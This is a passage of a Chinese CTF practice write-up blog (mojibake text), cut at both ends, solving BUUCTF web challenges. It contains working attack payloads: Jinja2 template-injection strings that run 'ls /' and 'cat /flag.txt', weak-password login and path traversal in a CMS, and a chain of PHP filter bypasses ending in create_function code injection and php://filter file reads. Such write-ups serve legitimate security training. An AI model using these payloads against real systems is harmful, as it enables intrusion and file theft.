</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">s_box</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rc4_excrypt</span><span class="p">(</span><span class="n">plain</span><span class="p">,</span> <span class="n">box</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># print(&#34;è°ƒç”¨åŠ å¯†ç¨‹åºæˆåŠŸã€‚&#34;)</span>
</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">plain</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span>
</span></span><span class="line"><span class="cl">        <span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="n">box</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span>
</span></span><span class="line"><span class="cl">        <span class="n">box</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">box</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">box</span><span class="p">[</span><span class="n">j</span><span class="p">],</span> <span class="n">box</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">t</span> <span class="o">=</span> <span class="p">(</span><span class="n">box</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">box</span><span class="p">[</span><span class="n">j</span><span class="p">])</span> <span class="o">%</span> <span class="mi">256</span>
</span></span><span class="line"><span class="cl">        <span class="n">k</span> <span class="o">=</span> <span class="n">box</span><span class="p">[</span><span class="n">t</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">res</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">^</span> <span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">cipher</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span><span class="n">quote</span><span class="p">(</span><span class="n">cipher</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">cipher</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)),</span> <span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">rc4_main</span><span class="p">(</span><span class="s2">&#34;HereIsTreasure&#34;</span><span class="p">,</span><span class="s2">&#34;{{lipsum.__globals__.__builtins__.eval(</span><span class="se">\&#34;</span><span class="s2">__import__(&#39;os&#39;).popen(&#39;cat /flag.txt&#39;).read()</span><span class="se">\&#34;</span><span class="s2">)}}&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;)}}
</span></span><span class="line"><span class="cl">{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).popen(&#34;cat /flag.txt&#34;).read()&#39;)}}
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250405143658043.png"
	width="1533"
	height="500"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250405143658043_hu4273674931847572516.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250405143658043_hu16056203718559103721.png 1024w"
	loading="lazy"
	
		alt="image-20250405143658043"
	
	
		class="gallery-image" 
		data-flex-grow="306"
		data-flex-basis="735px"
	
></p>
<h2 id="gkctf-2021easycms">[GKCTF 2021]easycms
</h2><p>ç›®å½•æ‰«æadmin.php</p>
<p>å¼±å£ä»¤admin/12345ç™»å…¥</p>
<p>åœ¨è®¾è®¡è¿™é‡Œè‡ªå®šä¹‰å¯ä»¥ç¼–è¾‘phpä»£ç </p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250405145501063.png"
	width="1530"
	height="756"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250405145501063_hu17915190112882951253.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250405145501063_hu1102986416410717993.png 1024w"
	loading="lazy"
	
		alt="image-20250405145501063"
	
	
		class="gallery-image" 
		data-flex-grow="202"
		data-flex-basis="485px"
	
></p>
<p>/var/www/html/system/tmp/tgom.txt</p>
<p>æ–°å»ºä¸€ä¸ªæ–‡ä»¶,ä¸Šä¼ åç¼–è¾‘</p>
<p>æ–‡ä»¶åä¸º../../../../../system/tmp/tgom</p>
<p>ç„¶åå›å»ç¼–è¾‘å°±è¡Œäº†ï¼Œå›åˆ°ä¸»é¡µå°±èƒ½çœ‹åˆ°flag</p>
<p>å¦ä¸€ç§åšæ³•ï¼Œå¯¼å‡ºä¸»é¢˜</p>
<p>ä¼šæç¤ºä¸‹è½½ï¼Œå¤åˆ¶ä¸‹è½½è¿æ¥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">18</span><span class="n">f6826c</span><span class="o">-</span><span class="mi">975</span><span class="n">b</span><span class="o">-</span><span class="mi">4018</span><span class="o">-</span><span class="mi">8</span><span class="n">d7c</span><span class="o">-</span><span class="mi">014</span><span class="n">a078b56b0</span><span class="o">.</span><span class="n">node5</span><span class="o">.</span><span class="n">buuoj</span><span class="o">.</span><span class="n">cn</span><span class="p">:</span><span class="mi">81</span><span class="o">/</span><span class="n">admin</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">m</span><span class="o">=</span><span class="n">ui</span><span class="o">&amp;</span><span class="n">f</span><span class="o">=</span><span class="n">downloadtheme</span><span class="o">&amp;</span><span class="n">theme</span><span class="o">=</span><span class="n">L3Zhci93d3cvaHRtbC9zeXN0ZW0vdG1wL3RoZW1lL2RlZmF1bHQvMS56aXA</span><span class="o">=</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æŠŠåé¢è¿™ä¸²base64è§£ç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">system</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">theme</span><span class="o">/</span><span class="n">default</span><span class="o">/</span><span class="mf">1.</span><span class="n">zip</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æˆ‘ä»¬æ”¹ä¸º/flagå°±è¡Œäº†</p>
<p>ç„¶åä¸‹è½½å¾—åˆ°flag</p>
<h2 id="bjdctf2020ezphp">[BJDCTF2020]EzPHP
</h2><p>çœ‹æºç æœ‰base32ç¼–ç ï¼Œè§£ç å¾—1nD3x.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="s2">&#34;1nD3x.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$shana</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;shana&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$passwd</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;passwd&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$arg</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$code</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&#34;|\&#39;|log/i&#39;</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>  
</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;You seem to want to do something bad?&#39;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/http|https/i&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^aqua_is_cute$/&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;debu&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;debu&#39;</span><span class="p">]</span> <span class="o">!==</span> <span class="s1">&#39;aqua_is_cute&#39;</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">        <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">];</span> 
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;Neeeeee! Good Job!&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;fxck you! What do you want to do ?!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="k">foreach</span><span class="p">(</span><span class="nv">$_REQUEST</span> <span class="k">as</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[a-zA-Z]/i&#39;</span><span class="p">,</span> <span class="nv">$value</span><span class="p">))</span>  
</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;fxck you! I hate English!&#39;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="o">!==</span> <span class="s1">&#39;debu_debu_aqua&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&lt;br&gt;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="nx">sha1</span><span class="p">(</span><span class="nv">$shana</span><span class="p">)</span> <span class="o">===</span> <span class="nx">sha1</span><span class="p">(</span><span class="nv">$passwd</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$shana</span> <span class="o">!=</span> <span class="nv">$passwd</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">extract</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;flag&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;Very good! you know my password. But what is flag?&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^[a-z0-9]*$/isD&#39;</span><span class="p">,</span> <span class="nv">$code</span><span class="p">)</span> <span class="o">||</span> 
</span></span><span class="line"><span class="cl"><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&amp;|\$|\*|\||\&lt;|\&#34;|\&#39;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#39;</span><span class="p">,</span> <span class="nv">$arg</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag =w=&#34;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="k">include</span> <span class="s2">&#34;flag.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$code</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$arg</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span> 
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ç¬¬ä¸€å±‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&#34;|\&#39;|log/i&#39;</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>  
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™ä¸€å±‚ç”¨urlç¼–ç ç»•è¿‡</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?%73hana=1
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç¬¬äºŒå±‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/http|https/i&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^aqua_is_cute$/&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;debu&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;debu&#39;</span><span class="p">]</span> <span class="o">!==</span> <span class="s1">&#39;aqua_is_cute&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>åœ¨ä¼ å…¥å‚æ•°æœ€ååŠ å…¥æ¢è¡Œç¬¦å°±èƒ½ç»•è¿‡%0a</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?%64ebu=%61qua_is_%63ute%0a
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç¬¬ä¸‰å±‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="k">foreach</span><span class="p">(</span><span class="nv">$_REQUEST</span> <span class="k">as</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[a-zA-Z]/i&#39;</span><span class="p">,</span> <span class="nv">$value</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>$_REQUESTåœ¨åŒæ—¶æ¥æ”¶GETå’ŒPOSTå‚æ•°æ—¶ï¼ŒPOSTä¼˜å…ˆçº§æ›´é«˜</p>
<p>æ‰€ä»¥åªéœ€è¦POSTç›¸åŒçš„å‚æ•°å³å¯ç»•è¿‡ã€‚</p>
<p>ç¬¬å››å±‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="o">!==</span> <span class="s1">&#39;debu_debu_aqua&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç”¨dataä¼ªåè®®æˆ–è€…php://inputå†™å…¥</p>
<p>ç¬¬äº”å±‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="nx">sha1</span><span class="p">(</span><span class="nv">$shana</span><span class="p">)</span> <span class="o">===</span> <span class="nx">sha1</span><span class="p">(</span><span class="nv">$passwd</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$shana</span> <span class="o">!=</span> <span class="nv">$passwd</span> <span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ•°ç»„ç»•è¿‡</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?shana[]=1&amp;passwd[]=2
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç¬¬å…­å±‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^[a-z0-9]*$/isD&#39;</span><span class="p">,</span> <span class="nv">$code</span><span class="p">)</span> <span class="o">||</span> 
</span></span><span class="line"><span class="cl"><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&amp;|\$|\*|\||\&lt;|\&#34;|\&#39;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#39;</span><span class="p">,</span> <span class="nv">$arg</span><span class="p">)</span> <span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>$code</code>å’Œ<code>$arg</code>å¯æ§ï¼Œåˆ©ç”¨<code>$code('',$arg)</code>è¿›è¡Œ<code>create_functionæ³¨å…¥</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">åœ¨ä¸Šä¸€é˜¶æ®µçš„</span><span class="n">extract</span><span class="p">(</span><span class="o">$</span><span class="n">_GET</span><span class="p">[</span><span class="s2">&#34;flag&#34;</span><span class="p">]);</span><span class="err">å¤„è¿›è¡Œå˜é‡è¦†ç›–ï¼Œä»è€Œä½¿å˜é‡</span><span class="o">$</span><span class="n">codeå’Œå˜é‡</span><span class="o">$</span><span class="n">argå¯æ§</span>
</span></span><span class="line"><span class="cl"><span class="err">é¦–å…ˆé—­åˆåŸæœ‰çš„è¯­å¥ï¼š</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="p">[</span><span class="n">arg</span><span class="p">]</span><span class="o">=</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="err">å¾ˆå¤šå‡½æ•°è¢«ç¦ç”¨ï¼Œå…ˆä½¿ç”¨</span><span class="n">get_defined_vars</span><span class="p">()</span><span class="err">å°†æ‰€æœ‰å˜é‡ä¸å€¼éƒ½è¿›è¡Œè¾“å‡º</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="p">[</span><span class="n">code</span><span class="p">]</span><span class="o">=</span><span class="n">create_function</span><span class="o">&amp;</span><span class="n">flag</span><span class="p">[</span><span class="n">arg</span><span class="p">]</span><span class="o">=</span><span class="p">}</span><span class="n">var_dump</span><span class="p">(</span><span class="n">get_defined_vars</span><span class="p">());</span><span class="o">//</span>
</span></span><span class="line"><span class="cl"><span class="o">//</span> <span class="err">ç­‰ä»·äº</span>
</span></span><span class="line"><span class="cl"><span class="n">function</span><span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">var_dump</span><span class="p">(</span><span class="n">get_defined_vars</span><span class="p">());</span><span class="o">//</span><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¾—åˆ°rea1fl4g.php</p>
<p>åˆ©ç”¨<code>require()</code>ï¼Œæ¥ä»£æ›¿<code>include()</code>ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">flag</span><span class="p">[</span><span class="n">code</span><span class="p">]</span><span class="o">=</span><span class="n">create_function</span><span class="o">&amp;</span><span class="n">flag</span><span class="p">[</span><span class="n">arg</span><span class="p">]</span><span class="o">=</span><span class="p">}</span><span class="n">require</span><span class="p">(</span><span class="n">base64_decode</span><span class="p">(</span><span class="n">cmVhMWZsNGcucGhw</span><span class="p">));</span><span class="n">var_dump</span><span class="p">(</span><span class="n">get_defined_vars</span><span class="p">());</span><span class="o">//</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¾—åˆ°å‡flag</p>
<p>urlå–åç»•è¿‡</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">echo</span> <span class="n">urlencode</span><span class="p">(</span><span class="o">~</span><span class="s1">&#39;php://filter/read=convert.base64-encode/resource=rea1fl4g.php&#39;</span><span class="p">);</span>
